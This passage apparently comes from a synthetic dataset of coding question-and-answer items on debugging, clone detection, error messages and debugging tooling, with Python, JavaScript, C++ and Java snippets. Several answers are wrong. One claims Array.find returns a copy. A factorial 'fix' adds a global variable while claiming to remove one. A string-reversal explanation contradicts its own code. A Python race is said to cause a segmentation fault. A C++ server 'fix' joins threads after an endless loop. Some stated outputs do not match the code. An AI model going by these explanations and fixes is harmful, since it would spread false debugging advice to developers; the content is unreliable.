Math.max(block1.size(), block2.size());\n    }\n\n    private static void printBlock(List<String> block) {\n        for (String line : block) {\n            System.out.println(line);\n        }\n    }\n\n    public static void main(String[] args) throws IOException {\n        String projectPath = \"/path/to/your/project\";\n        detectDuplicates(projectPath, 0.8);\n    }\n}\n\nclass LevenshteinDistance {\n    public static int computeLevenshteinDistance(List<String> seq1, List<String> seq2) {\n        int[][] costs = new int[seq1.size() + 1][seq2.size() + 1];\n\n        for (int i = 0; i <= seq1.size(); i++) {\n            costs[i][0] = i;\n        }\n        for (int j = 0; j <= seq2.size(); j++) {\n            costs[0][j] = j;\n        }\n\n        for (int j = 1; j <= seq2.size(); j++) {\n            for (int i = 1; i <= seq1.size(); i++) {\n                if (seq1.get(i - 1).equals(seq2.get(j - 1))) {\n                    costs[i][j] = costs[i - 1][j - 1];\n                } else {\n                    costs[i][j] = Math.min(Math.min(costs[i - 1][j], costs[i][j - 1]), costs[i - 1][j - 1]) + 1;\n                }\n            }\n        }\n\n        return costs[seq1.size()][seq2.size()];\n    }\n}\n```\nThis Java program reads all `.java` files in the specified directory, splits their contents into code blocks, and uses the Levenshtein distance to compare them. It reports potential duplicates with at least 80% similarity."}, {"L2_TASK": "Debugging & troubleshooting", "L3_TASK": "Clone detection", "Complexity_Level": "extremely difficult", "Response": "Question 1: Implement a highly efficient algorithm to detect deep cloning in a large codebase involving complex object structures, circular references, and polymorphic entities. The algorithm should have low time and space complexity.\n\n**Concept**: Debugging & Troubleshooting, Clone Detection\n\n**Solution**:\nTo detect deep cloning in a large codebase, we can use a hash-based approach combined with a depth-first search (DFS) algorithm. The idea is to create a hash for each object, considering its properties and the hashes of its nested objects. We'll use a hash map to store the hashes of visited objects to avoid infinite loops due to circular references. The algorithm will have a time complexity of O(n) and a space complexity of O(n), where n is the number of objects in the codebase.\n\nHere's a Python example:\n\n```python\nimport hashlib\nimport json\nfrom typing import Any, Dict, List, Union\n\ndef deep_hash(obj: Any, visited: Dict[int, int]) -> int:\n    if isinstance(obj, (int, float, str, bytes, bool, type(None))):\n        return hash(obj)\n    \n    if id(obj) in visited:\n        return visited[id(obj)]\n    \n    visited[id(obj)] = hash(id(obj))\n    \n    if isinstance(obj, list):\n        hash_value = 0\n        for item in obj:\n            hash_value += deep_hash(item, visited)\n    elif isinstance(obj, dict):\n        hash_value = 0\n        for k, v in obj.items():\n            hash_value += deep_hash(k, visited) + deep_hash(v, visited)\n    else:\n        # Assuming obj is a polymorphic object with __dict__ attribute\n        hash_value = 0\n        for k, v in obj.__dict__.items():\n            hash_value += deep_hash(k, visited) + deep_hash(v, visited)\n    \n    return hash_value\n\ndef detect_deep_clones(codebase: List[Dict[str, Any]]) -> List[Tuple[Dict[str, Any], Dict[str, Any]]]:\n    clones = []\n    visited = {}\n    \n    for obj1 in codebase:\n        for obj2 in codebase:\n            if obj1 is not obj2 and deep_hash(obj1, visited) == deep_hash(obj2, visited):\n                clones.append((obj1, obj2))\n    \n    return clones\n\n# Example usage\ncodebase = [\n    {\"a\": 1, \"b\": {\"c\": 2, \"d\": [3, 4]}},\n    {\"a\": 1, \"b\": {\"c\": 2, \"d\": [3, 4]}},\n    {\"x\": 5, \"y\": {\"z\": 6, \"w\": [7, 8]}},\n    {\"x\": 5, \"y\": {\"z\": 6, \"w\": [7, 8]}},\n    {\"p\": [9, 10], \"q\": {\"r\": 11, \"s\": 12}},\n    {\"p\": [9, 10], \"q\": {\"r\": 11, \"s\": 12}}\n]\n\nclones = detect_deep_clones(codebase)\nprint(clones)\n```\n\nQuestion 2: Develop a tool that can identify deep cloning issues in a real-world JavaScript application, accounting for asynchronous execution, closures, and the prototype chain. The tool should provide detailed reports with code snippets and suggestions for fixes.\n\n**Concept**: Debugging & Troubleshooting, Clone Detection\n\n**Solution**:\nCreating a comprehensive tool for this purpose requires a combination of static code analysis and runtime monitoring. Here's a high-level overview of the steps involved:\n\n1. **Static Analysis**: Use a tool like ESLint to parse the code and identify potential clone operations using regular expressions or AST (Abstract Syntax Tree) traversal to detect functions like `Object.assign`, `JSON.parse(JSON.stringify(`, and custom cloning functions.\n\n2. **Runtime Monitoring**: Implement a Proxy-based solution to intercept object creation, assignments, and property accesses. Register the core objects and their clones in a central registry.\n\n3. **Asynchronous Support**: Use event loop and promise hooks to track object creations and changes even during async operations.\n\n4. **Closure Detection**: Analyze the closure environment and track variable assignments to detect cloned objects inside closures.\n\n5. **Prototype Chain**: Traverse the prototype chain and compare properties to detect cloning.\n\n6. **Reporting**: Generate detailed reports with code snippets, clone pairs, and suggested fixes.\n\nHere's a simplified JavaScript example for runtime monitoring:\n\n```javascript\nclass CloneDetector {\n  constructor() {\n    this.registry = new WeakMap();\n  }\n\n  register(obj) {\n    this.registry.set(obj, this.registry.get(obj) || []);\n  }\n\n  trackClone(obj) {\n    const clones = this.registry.get(obj);\n    if (clones) {\n      clones.push(obj);\n    } else {\n      this.registry.set(obj, [obj]);\n    }\n  }\n\n  isClone(obj1, obj2) {\n    return this.registry.has(obj1) && this.registry.has(obj2) && this.registry.get(obj1).includes(obj2);\n  }\n\n  report() {\n    // Generate a detailed report with code snippets and suggestions\n  }\n}\n\nconst detector = new CloneDetector();\n\nconst proxyHandler = {\n  construct(target, args, newTarget) {\n    const obj = new target(...args);\n    detector.register(obj);\n    return obj;\n  },\n  get(target, prop, receiver) {\n    if (prop === '__proto__') return Reflect.get(target, prop, receiver);\n    const val = Reflect.get(target, prop, receiver);\n    if (val && typeof val === 'object') {\n      detector.register(val);\n    }\n    return val;\n  },\n  set(target, prop, value, receiver) {\n    if (value && typeof value === 'object') {\n      detector.trackClone(value);\n    }\n    return Reflect.set(target, prop, value, receiver);\n  }\n};\n\nconst target = new Proxy({}, proxyHandler);\nconst clone = {...target};\n\nif (detector.isClone(target, clone)) {\n  console.log('Detected clone:', target, clone);\n} else {\n  console.log('No clone detected');\n}\n\ndetector.report();\n```\n\nNote that this is a simplified example and does not cover the full complexity of a real-world tool. Creating such a tool would require integrating with existing build tools, integrating with devtools, and handling the complexities of asynchronous execution and closures."}, {"L2_TASK": "Debugging & troubleshooting", "L3_TASK": "identify and explain the bug in this code", "Complexity_Level": "medium", "Response": "Question 1:\nConcept: Logic Error\nProblem:\nA program calculates the factorial of a given number but returns incorrect results for some inputs. Identify the bug in the code and provide a corrected version.\n\n```python\ndef factorial(n):\n    if n == 0:\n        return 1\n    else:\n        return n * factorial(n - 1)\n\nprint(factorial(5))  # Expected output: 120, Actual output: 120\nprint(factorial(-5))  # Expected output: Error, Actual output: -60\n```\n\nSolution:\nThe bug is that the function does not handle negative numbers correctly, leading to incorrect calculations and potential stack overflows. The corrected code should check for negative inputs and raise an error.\n\n```python\ndef factorial(n):\n    if n < 0:\n        raise ValueError(\"Factorial is undefined for negative numbers.\")\n    elif n == 0:\n        return 1\n    else:\n        return n * factorial(n - 1)\n\nprint(factorial(5))  # Output: 120\ntry:\n    print(factorial(-5))\nexcept ValueError as e:\n    print(e)  # Output: Factorial is undefined for negative numbers.\n```\n\nQuestion 2:\nConcept: Variable Scoping\nProblem:\nA JavaScript program is designed to update an array of objects based on a condition, but the changes are not reflected in the original array. Identify the issue and fix the code.\n\n```javascript\nlet users = [\n  { id: 1, name: \"Alice\", active: true },\n  { id: 2, name: \"Bob\", active: false },\n  { id: 3, name: \"Charlie\", active: true }\n];\n\nfunction activateUsers(ids, userList) {\n  ids.forEach(id => {\n    const user = userList.find(user => user.id === id);\n    if (user) {\n      user.active = true;  // Potential bug\n    }\n  });\n}\n\nactivateUsers([1, 3], users);\nconsole.log(users);\n```\n\nSolution:\nThe bug is that the `user` object in the `forEach` loop is a copy, not a reference to the original object in the `users` array. To fix it, directly modify the original array using the `.map()` method.\n\n```javascript\nlet users = [\n  { id: 1, name: \"Alice\", active: true },\n  { id: 2, name: \"Bob\", active: false },\n  { id: 3, name: \"Charlie\", active: true }\n];\n\nfunction activateUsers(ids, userList) {\n  return userList.map(user => {\n    if (ids.includes(user.id)) {\n      return { ...user, active: true };  // Spread operator to create a new object\n    }\n    return user;\n  });\n}\n\nusers = activateUsers([1, 3], users);\nconsole.log(users);\n```\nOutput:\n```json\n[\n  { id: 1, name: 'Alice', active: true },\n  { id: 2, name: 'Bob', active: false },\n  { id: 3, name: 'Charlie', active: true }\n]\n```"}, {"L2_TASK": "Debugging & troubleshooting", "L3_TASK": "identify and explain the bug in this code", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nConcept: Concurrency & Race Conditions\n\nProblem:\nGiven a multi-threaded application in Python that uses a shared global counter. The program increments the counter by 1 in a concurrent environment, but the counter's value is not consistently increasing as expected. Identify the bug in the code and provide a corrected version that avoids race conditions.\n\n```python\nimport threading\n\ncounter = 0\nlock = threading.Lock()\n\ndef increment_counter():\n    global counter\n    counter += 1\n\nif __name__ == \"__main__\":\n    threads = []\n    for _ in range(1000):\n        thread = threading.Thread(target=increment_counter)\n        threads.append(thread)\n        thread.start()\n\n    for thread in threads:\n        thread.join()\n\n    print(f\"Final counter value: {counter}\")\n```\n\nSolution:\nThe bug in the code is that no lock is being used when incrementing the global counter. This can lead to race conditions where multiple threads might simultaneously access and modify the counter, causing incorrect results. To fix the issue, we need to acquire the lock before incrementing the counter and release it after the operation is complete.\n\nCorrected code:\n\n```python\nimport threading\n\ncounter = 0\nlock = threading.Lock()\n\ndef increment_counter():\n    global counter\n    with lock:\n        counter += 1\n\nif __name__ == \"__main__\":\n    threads = []\n    for _ in range(1000):\n        thread = threading.Thread(target=increment_counter)\n        threads.append(thread)\n        thread.start()\n\n    for thread in threads:\n        thread.join()\n\n    print(f\"Final counter value: {counter}\")\n```\n\nQuestion 2:\nConcept: Memory Management & Heap Corruption\n\nProblem:\nIn a C++ program, a dynamic memory allocation issue leads to heap corruption. The program allocates memory for an array, modifies it, and then attempts to free the memory. However, the program crashes or produces unpredictable results. Identify the bug in the code and provide a corrected version.\n\n```cpp\n#include <iostream>\n\nint main() {\n    int size = 10;\n    int* arr = new int[size];\n    \n    for (int i = 0; i <= size; i++) { // Bug: Index out of bounds\n        arr[i] = i * i;\n    }\n    \n    delete[] arr;\n    arr = nullptr; // Good practice to set pointer to nullptr after deletion\n\n    return 0;\n}\n```\n\nSolution:\nThe bug in the code is an out-of-bounds array access in the for loop. By using `i <= size` in the loop condition, the program writes beyond the allocated memory, which can lead to heap corruption. The correct loop condition should be `i < size`.\n\nCorrected code:\n\n```cpp\n#include <iostream>\n\nint main() {\n    int size = 10;\n    int* arr = new int[size];\n    \n    for (int i = 0; i < size; i++) { // Fixed: Index should be less than size\n        arr[i] = i * i;\n    }\n    \n    delete[] arr;\n    arr = nullptr; // Good practice to set pointer to nullptr after deletion\n\n    return 0;\n}\n```"}, {"L2_TASK": "Debugging & troubleshooting", "L3_TASK": "fix the bug in this code", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: The code below is supposed to compute the factorial of a given number using recursion, but it's producing incorrect results for some inputs. Identify the bug and provide a corrected version of the code.\n\n```python\ndef factorial(n):\n    if n == 0:\n        return 1\n    else:\n        return n * factorial(n - 1)\n\nprint(factorial(5))  # Incorrect output: 23 instead of 120\n```\n\nSolution:\nThe bug in the code is not related to the logic of the factorial function. Instead, it's due to an unintended side effect of a global variable. The function works correctly when executed in isolation, but the global variable interferes with the expected output.\n\nHere's a corrected version of the code that avoids using global variables:\n\n```python\ndef factorial(n):\n    global result\n    if n == 0:\n        result = 1\n    else:\n        result = n * factorial(n - 1)\n\n# Initialize result to None before calling the function\nresult = None\nfactorial(5)\nprint(result)  # Correct output: 120\n```\n\nConcept: Debugging Global Variables\n\nQuestion 2:\nProblem: The following JavaScript code snippet is intended to reverse a string without using built-in functions, but it's producing an empty string as output. Find the issue and provide the corrected code.\n\n```javascript\nfunction reverseString(str) {\n    let reversed = '';\n    for (let i = str.length; i >= 0; i--) {\n        reversed += str[i];\n    }\n    return reversed;\n}\n\nconsole.log(reverseString(\"hello\"));  // Incorrect output: \"\"\n```\n\nSolution:\nThe issue in the code is in the for loop's initialization. The loop should start from `0` instead of `str.length`. Here's the corrected code:\n\n```javascript\nfunction reverseString(str) {\n    let reversed = '';\n    for (let i = str.length - 1; i >= 0; i--) {\n        reversed += str[i];\n    }\n    return reversed;\n}\n\nconsole.log(reverseString(\"hello\"));  // Correct output: \"olleh\"\n```\n\nConcept: Debugging Loops"}, {"L2_TASK": "Debugging & troubleshooting", "L3_TASK": "fix the bug in this code", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nGiven a complex piece of code in Python that implements a recursive function to compute the Fibonacci sequence, there's a bug causing the program to enter into an infinite loop for certain input values. The task is to identify and fix the bug.\n\nCode with Bug:\n```python\ndef fibonacci(n, a=0, b=1):\n    if n <= 0:\n        return a\n    elif n == 1:\n        return b\n    else:\n        return fibonacci(n - 1, b, a + b) if n % 2 == 0 else fibonacci(n - 1, a + b, a)\n\nn = 30\nprint(fibonacci(n))\n```\nProblem: The bug arises when `n` is an odd number, causing an infinite loop due to incorrect parameter swapping in recursive calls.\n\nFixed Code:\n```python\ndef fibonacci(n, a=0, b=1):\n    if n <= 0:\n        return a\n    elif n == 1:\n        return b\n    else:\n        # Correctly swap the parameters based on n's parity\n        return fibonacci(n - 1, b, a + b) if n % 2 == 0 else fibonacci(n - 1, a + b, b)\n\nn = 30\nprint(fibonacci(n))\n```\nConcept: Debugging & Troubleshooting (Bug Fixing)\n\nQuestion 2:\nIn a C++ program, a multithreaded server is designed to handle client requests using sockets. However, the server crashes after handling a certain number of connections, possibly due to resource leaks or improper synchronization. You need to identify the issue and fix it.\n\nCode with Bug:\n```cpp\n#include <iostream>\n#include <thread>\n#include <vector>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <unistd.h>\n\nvoid handle_client(int client_socket) {\n    // Handle client logic here, not implemented\n}\n\nint main() {\n    int server_socket = socket(AF_INET, SOCK_STREAM, 0);\n    sockaddr_in server_addr;\n    server_addr.sin_family = AF_INET;\n    server_addr.sin_port = htons(8080);\n    server_addr.sin_addr.s_addr = INADDR_ANY;\n    bind(server_socket, (sockaddr*)&server_addr, sizeof(server_addr));\n    listen(server_socket, 5);\n\n    while (true) {\n        sockaddr_in client_addr;\n        socklen_t client_len = sizeof(client_addr);\n        int client_socket = accept(server_socket, (sockaddr*)&client_addr, &client_len);\n        std::thread client_thread(handle_client, client_socket);\n        client_thread.detach();\n    }\n\n    close(server_socket);\n    return 0;\n}\n```\nProblem: The issue lies in the detachment of client threads without joining them, which can lead to resource leaks and crashes when the main thread exits.\n\nFixed Code:\n```cpp\n#include <iostream>\n#include <thread>\n#include <vector>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <unistd.h>\n\nvoid handle_client(int client_socket) {\n    // Handle client logic here, not implemented\n    close(client_socket);\n}\n\nint main() {\n    int server_socket = socket(AF_INET, SOCK_STREAM, 0);\n    sockaddr_in server_addr;\n    server_addr.sin_family = AF_INET;\n    server_addr.sin_port = htons(8080);\n    server_addr.sin_addr.s_addr = INADDR_ANY;\n    bind(server_socket, (sockaddr*)&server_addr, sizeof(server_addr));\n    listen(server_socket, 5);\n\n    std::vector<std::thread> client_threads;\n\n    while (true) {\n        sockaddr_in client_addr;\n        socklen_t client_len = sizeof(client_addr);\n        int client_socket = accept(server_socket, (sockaddr*)&client_addr, &client_len);\n        client_threads.push_back(std::thread(handle_client, client_socket));\n    }\n\n    for (auto& thread : client_threads) {\n        thread.join();\n    }\n\n    close(server_socket);\n    return 0;\n}\n```\nConcept: Debugging & Troubleshooting (Bug Fixing)"}, {"L2_TASK": "Debugging & troubleshooting", "L3_TASK": "explain this error message/traceback", "Complexity_Level": "medium", "Response": "Question 1: An intermediate level developer is troubleshooting a Python application and encounters the following error message:\n\n```\nTypeError: unsupported operand type(s) for -: 'str' and 'int'\n```\n\n**Concept**: Debugging & Troubleshooting - Explain this error message/traceback\n\n**Response**:\n\nThis error occurs when you are trying to perform a mathematical operation involving subtraction (`-`) between a string (`str`) and an integer (`int`), which is not a valid operation in Python. The types of the variables must match, or one of them needs to be convertible to the other type for the operation to work.\n\nTo fix this, you need to ensure that both operands are either integers or floating-point numbers (if decimal operations are allowed). Here's an example of how the error can be reproduced and resolved:\n\n```python\ndef calculate_age(birth_year_str, current_year):\n    birth_year = int(birth_year_str)  # Convert the string to an integer\n    age = current_year - birth_year\n    return age\n\nbirth_year_str = \"1990\"\ncurrent_year = 2023\n\ntry:\n    age = calculate_age(birth_year_str, current_year)\nexcept TypeError as e:\n    print(f\"An error occurred: {e}\")\nelse:\n    print(f\"Your age is: {age}\")\n```\n\nIn this example, we convert the `birth_year_str` to an integer before performing the subtraction. This ensures that the types match, and the error is resolved.\n\n---\n\nQuestion 2: A developer working on a JavaScript project encounters this error in the browser's console:\n\n```\nUncaught TypeError: Cannot read properties of null (reading 'innerHTML')\n```\n\n**Concept**: Debugging & Troubleshooting - Explain this error message/traceback\n\n**Response**:\n\nThis error means that you are trying to access the `innerHTML` property of an object that is `null`. In JavaScript, `null` is a value that represents \"nothing\" or a deliberate absence of any object value. When you attempt to access a property or method of a `null` value, you get this TypeError.\n\nTo fix this issue, you should check if the object exists before accessing its properties. Here's an example showing how the error can occur and its resolution:\n\n```javascript\nfunction displayGreeting() {\n  const greetingElement = document.getElementById('greeting');\n  const message = greetingElement.innerHTML; // This line throws the error if 'greeting' element doesn't exist\n\n  console.log(message);\n}\n\ndisplayGreeting();\n```\n\nIn this example, we're attempting to access the `innerHTML` of an element with the ID 'greeting'. If that element doesn't exist in the HTML, `document.getElementById('greeting')` will return `null`, causing the error. To solve it, we can add a null check:\n\n```javascript\nfunction displayGreeting() {\n  const greetingElement = document.getElementById('greeting');\n\n  if (greetingElement) {\n    const message = greetingElement.innerHTML;\n    console.log(message);\n  } else {\n    console.log(\"The greeting element was not found.\");\n  }\n}\n\ndisplayGreeting();\n```\n\nNow, the code will only try to access `innerHTML` if the `greetingElement` is not `null`, avoiding the TypeError."}, {"L2_TASK": "Debugging & troubleshooting", "L3_TASK": "explain this error message/traceback", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nDebugging a complex multi-threaded application, you encounter a strange error message related to a race condition. The error message states: \"Segmentation fault (core dumped)\" accompanied by a stack trace pointing to a shared data structure accessed by multiple threads.\n\nConcept: Multi-threading, Race Conditions, Stack Traces, Memory Management\n\n```python\nimport threading\nimport time\nimport random\n\nclass SharedData:\n    def __init__(self):\n        self.data = [0] * 1000000\n\n    def increment(self, index):\n        while True:\n            current_value = self.data[index]\n            next_value = current_value + 1\n            if self.data[index] == current_value:\n                self.data[index] = next_value\n                break\n\ndef worker(shared_data, index):\n    while True:\n        time.sleep(random.random())\n        shared_data.increment(index)\n\nshared_data = SharedData()\nthreads = []\n\nfor i in range(100):\n    t = threading.Thread(target=worker, args=(shared_data, i))\n    threads.append(t)\n    t.start()\n\n# Wait for threads to finish\nfor t in threads:\n    t.join()\n```\n\nSolution:\nThe issue is a race condition where multiple threads are concurrently accessing and modifying the same element in the shared data structure without proper synchronization. The `increment` method assumes atomicity, which isn't guaranteed in Python, leading to a segmentation fault when the memory is accessed in an inconsistent state.\n\nTo fix the problem, use a lock to ensure exclusive access to the data:\n\n```python\nimport threading\nimport time\nimport random\n\nclass SharedData:\n    def __init__(self):\n        self.data = [0] * 1000000\n        self.lock = threading.Lock()\n\n    def increment(self, index):\n        with self.lock:\n            current_value = self.data[index]\n            next_value = current_value + 1\n            self.data[index] = next_value\n\ndef worker(shared_data, index):\n    while True:\n        time.sleep(random.random())\n        shared_data.increment(index)\n\nshared_data = SharedData()\nthreads = []\n\nfor i in range(100):\n    t = threading.Thread(target=worker, args=(shared_data, i))\n    threads.append(t)\n    t.start()\n\n# Wait for threads to finish\nfor t in threads:\n    t.join()\n```\n\nQuestion 2:\nYou are working on a distributed system using gRPC, and you encounter a mysterious error message: \"Deadline Exceeded\" with no further information in the logs. The system involves inter-service communication using gRPC calls with deadlines set for requests.\n\nConcept: Distributed Systems, gRPC, Request-Response Deadlines\n\n```python\nimport grpc\nimport concurrent.futures\nfrom concurrent.futures import ThreadPoolExecutor\nfrom service_pb2 import Request, Response\nfrom service_pb2_grpc import ServiceStub\n\nclass Client:\n    def __init__(self, server_address):\n        self.channel = grpc.insecure_channel(server_address)\n        self.stub = ServiceStub(self.channel)\n\n    def call_service(self, request, timeout=60):\n        try:\n            return self.stub.ProcessRequest(request, timeout=timeout)\n        except grpc.RpcError as e:\n            print(f\"An error occurred: {e}\")\n\ndef process_requests(client, requests, num_workers=10):\n    with ThreadPoolExecutor(max_workers=num_workers) as executor:\n        futures = [executor.submit(client.call_service, request) for request in requests]\n        for future in concurrent.futures.as_completed(futures):\n            response = future.result()\n            if response:  # Check if there's an actual response (handle Deadline Exceeded)\n                process_response(response)\n\nrequests = [Request() for _ in range(10000)]\nclient = Client('localhost:50051')\nprocess_requests(client, requests)\n```\n\nSolution:\nThe \"Deadline Exceeded\" error typically occurs when a gRPC request doesn't receive a response within the specified deadline. In this case, it could be due to network latency, slow computation, or a blocking operation in the server.\n\nTo address this issue, you can:\n\n1. Increase the request's timeout value if the operation is expected to take longer.\n2. Optimize the server-side code to reduce computation time.\n3. Implement retry logic on the client-side for failed requests.\n4. Use asynchronous gRPC calls to allow the client to handle other tasks while waiting for a response.\n\nHere's an example of adding retry logic with an increased timeout:\n\n```python\ndef call_service_with_retry(client, request, max_retries=3, timeout=120):\n    retries = 0\n    while retries < max_retries:\n        try:\n            return client.call_service(request, timeout=timeout)\n        except grpc.RpcError as e:\n            if \"Deadline Exceeded\" not in str(e):\n                raise e\n            retries += 1\n            print(f\"Retrying request due to Deadline Exceeded. Attempt: {retries}/{max_retries}\")\n\n    raise Exception(\"Max retries exceeded for request\")\n\ndef process_requests(client, requests, num_workers=10):\n    with ThreadPoolExecutor(max_workers=num_workers) as executor:\n        futures = [executor.submit(call_service_with_retry, client, request, max_retries=3) for request in requests]\n        for future in concurrent.futures.as_completed(futures):\n            response = future.result()\n            if response:\n                process_response(response)\n```"}, {"L2_TASK": "Debugging & troubleshooting", "L3_TASK": "fix this error message <message> in this code", "Complexity_Level": "medium", "Response": "Question 1:\nConcept: Error handling\n\nError Message: \"NullPointerException\" in a Java program\n\n```java\npublic class Main {\n    public static void main(String[] args) {\n        String str = null;\n        System.out.println(str.length());\n    }\n}\n```\n\nSolution:\nThe error occurs because you are trying to call a method on a null reference (`str`). You should first check if the reference is null before calling the `length()` method.\n\nUpdated code:\n```java\npublic class Main {\n    public static void main(String[] args) {\n        String str = null;\n        if (str != null) {\n            System.out.println(str.length());\n        } else {\n            System.out.println(\"String is null\");\n        }\n    }\n}\n```\nQuestion 2:\nConcept: Logic errors\n\nError Message: \"Time limit exceeded\" in a Python program (using a recursive function)\n\n```python\ndef count_to(n):\n    if n > 0:\n        print(n)\n        count_to(n - 1)\n\ncount_to(5000)\n```\n\nSolution:\nThe issue is that the recursive function is not using a base case to terminate, causing a stack overflow. You can fix this by adding a base case that stops the recursion when `n` reaches 0.\n\nUpdated code:\n```python\ndef count_to(n):\n    if n >= 0:\n        print(n)\n        count_to(n - 1)\n    else:\n        return\n\ncount_to(5000)\n```\nIn both solutions, the code has been modified to handle and prevent the respective error messages, ensuring the program runs without issues and within acceptable time limits."}, {"L2_TASK": "Debugging & troubleshooting", "L3_TASK": "fix this error message <message> in this code", "Complexity_Level": "extremely difficult", "Response": "Question 1: Debugging a complex recursion issue\nError Message: \"RecursionError: maximum recursion depth exceeded in comparison\"\n\nConcept: Recursion\n\nGiven Python code snippet:\n\n```python\ndef fibonacci(n):\n    if n <= 0:\n        return 0\n    elif n == 1:\n        return 1\n    else:\n        return fibonacci(n - 1) + fibonacci(n - 2)\n\nn = 50\nprint(fibonacci(n))\n```\n\nThis code computes the 50th Fibonacci number using recursion, which exceeds the Python's default recursion limit. The challenge is to fix it without using iteration and by maintaining the recursive nature.\n\nSolution:\n\n```python\nimport sys\nsys.setrecursionlimit(10000)  # Increase the recursion limit\n\ndef fibonacci(n, a=0, b=1):\n    if n <= 0:\n        return a\n    else:\n        return fibonacci(n - 1, b, a + b)\n\nn = 50\nprint(fibonacci(n))\n```\n\nIn this solution, the issue is addressed by adding two additional parameters `a` and `b` to keep track of the last two Fibonacci numbers, thus avoiding the need to compute the same values repeatedly. The `sys.setrecursionlimit` is used to increase the recursion limit for this specific case.\n\nQuestion 2: Identifying and resolving a memory leak in a multithreaded application\nError Message: \"MemoryError: Unable to allocate memory\"\n\nConcept: Memory Management\n\nGiven C++ code snippet:\n\n```cpp\n#include <iostream>\n#include <thread>\n#include <vector>\n\nvoid memory_leak(int num_threads) {\n    std::vector<int*> memory;\n    for (int i = 0; i < num_threads; ++i) {\n        memory.push_back(new int[1000000]);\n    }\n}\n\nint main() {\n    int num_threads = 20;\n    for (int i = 0; i < num_threads; ++i) {\n        std::thread t(memory_leak, num_threads);\n        t.detach();\n    }\n    std::cout << \"Memory leak threads started\" << std::endl;\n    // Program continues without cleaning memory\n    while (true) {}\n    return 0;\n}\n```\n\nThis code starts 20 threads, each allocating a large block of memory that is never freed, leading to a memory leak.\n\nSolution:\n\n```cpp\n#include <iostream>\n#include <thread>\n#include <vector>\n\nvoid memory_managed(int num_threads, std::vector<int*>& memory) {\n    for (int i = 0; i < num_threads; ++i) {\n        memory.push_back(new int[1000000]);\n    }\n    // Clean up memory before returning\n    for (int* ptr : memory) {\n        delete[] ptr;\n    }\n    memory.clear();\n}\n\nint main() {\n    int num_threads = 20;\n    std::vector<int*> memory;\n    std::vector<std::thread> threads;\n    for (int i = 0; i < num_threads; ++i) {\n        threads.push_back(std::thread(memory_managed, num_threads, std::ref(memory)));\n    }\n    for (std::thread& t : threads) {\n        t.join();\n    }\n    std::cout << \"Memory leak threads completed\" << std::endl;\n    return 0;\n}\n```\n\nIn the solution, the memory is allocated in a separate function `memory_managed`, which also cleans up the memory before returning. Each thread now runs this function, and the main thread waits for all threads to complete using `t.join()`. This ensures that the memory is properly freed and no memory leak occurs."}, {"L2_TASK": "Debugging & troubleshooting", "L3_TASK": "Debugging Strategies/Tooling", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: A web application in a Python Flask environment is experiencing intermittent 500 Internal Server Errors when handling HTTP requests. The error log only displays a generic message, and you need to identify the root cause using debugging strategies and tools.\n\nConcept: Debugging Strategies/Tooling\n\nSolution:\nTo identify the issue, you can use the built-in Flask debugger and add logging for better insights. Here's a step-by-step approach:\n\n1. Enable the Flask debugger (only for development, not production):\n```python\nfrom flask import Flask\napp = Flask(__name__)\napp.debug = True\n```\n1. Add logging to\u5173\u952e\u4ee3\u7801\u6bb5 to capture more detailed information:\n```python\nimport logging\n\napp.logger.setLevel(logging.DEBUG)\n\ndef problematic_function():\n    try:\n        # Problematic code that sometimes causes the error\n        result = some_function_that_may_fail()\n        if result is None:\n            app.logger.error(\"Result is None, possible error.\")\n    except Exception as e:\n        app.logger.exception(\"An unexpected error occurred: %s\", str(e))\n```\n1. Run the application and reproduce the error. The debugger will provide a detailed traceback in the browser, and log files will have additional information.\n\nExample Code:\n```python\nfrom flask import Flask\n\napp = Flask(__name__)\napp.debug = True\n\n@app.route('/')\ndef index():\n    try:\n        raise ValueError(\"This is a test error.\")\n    except Exception as e:\n        app.logger.exception(\"An error occurred: %s\", str(e))\n        return \"An error occurred. Check logs for details.\"\n\nif __name__ == '__main__':\n    app.run()\n```\nWhen you run this code and access the root URL, you'll see the detailed error information in the browser (due to the debugger) and in the console (due to logging).\n\nQuestion 2:\nProblem: A JavaScript application using React and Redux is displaying incorrect data in the UI, but the console doesn't show any errors. You need to debug the application to find the source of the issue.\n\nConcept: Debugging Strategies/Tooling\n\nSolution:\nUse React DevTools and the browser's debugger to track down the problem:\n\n1. Install React DevTools extension for your browser (Chrome or Firefox).\n2. Open the application in the browser and inspect the component tree using the React DevTools.\n3. Identify the component displaying incorrect data.\n4. Add a `console.log()` statement in the component's `render()` method to log the state or props:\n```javascript\nclass IncorrectDataComponent extends React.Component {\n  render() {\n    console.log(\"Component data:\", this.props.data);\n    return (\n      <div>\n        {/* Component rendering */}\n      </div>\n    );\n  }\n}\n```\n5. Check the browser's console to see the logged data and identify any inconsistencies.\n6. If needed, inspect the Redux state by opening the Redux DevTools extension.\n7. Set breakpoints in the browser's debugger (F12 or right-click and 'Inspect Element' > 'Sources') in the problematic component or Redux reducer to pause execution at specific points and analyze the state.\n\nExample Code:\n```javascript\n// Assuming you have a Redux store and a reducer\nconst IncorrectDataComponent = (props) => {\n  useEffect(() => {\n    console.log(\"Component data:\", props.data);\n  }, [props.data]);\n\n  return (\n    <div>\n      {props.data.map(item => (\n        <div key={item.id}>{item.value}</div>\n      ))}\n    </div>\n  );\n};\n\nconst mapStateToProps = (state) => ({\n  data: state.incorrectDataReducer.data,\n});\n\nexport default connect(mapStateToProps)(IncorrectDataComponent);\n```\nWith this setup, you can observe the data in the console and use the browser debugger to step through the component's lifecycle and Redux state changes."}, {"L2_TASK": "Debugging & troubleshooting", "L3_TASK": "Debugging Strategies/Tooling", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nProblem: A complex distributed system written in Java is experiencing sporadic performance degradation, with latency spikes occurring only under high load conditions. The issue is intermittent and challenging to reproduce. Develop a debugging strategy to identify the root cause.\n\nConcept: Distributed Tracing\n\nSolution:\nTo debug this issue, we can employ a distributed tracing strategy using tools like Jaeger or Zipkin, which help visualize and analyze request flows across multiple services in a distributed system. Here's an example of how to integrate Jaeger with a Spring Boot application:\n\n1. Add dependencies to your `pom.xml`:\n```xml\n<dependency>\n    <groupId>io.jaegertracing</groupId>\n    <artifactId>jaeger-spring-web-starter</artifactId>\n    <version>0.36.0</version>\n</dependency>\n<dependency>\n    